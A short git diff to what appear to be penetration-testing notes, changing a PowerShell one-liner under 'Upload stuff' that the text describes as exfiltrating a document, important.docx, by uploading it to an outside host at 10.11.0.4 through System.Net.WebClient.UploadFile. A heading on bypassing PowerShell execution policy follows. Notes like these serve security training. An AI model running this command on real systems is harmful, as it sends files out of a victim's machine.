@@ -27,7 +27,7 @@ host and invoke the UploadFile method from the System.Net.WebClient class to upl
 document we want to exfiltrate, in this case, a file named important.docx:
 
 ## Upload stuff
-powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
+powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'C:\Path\to\your\important.docx')
 
 
 ## Bypass Powershell EP
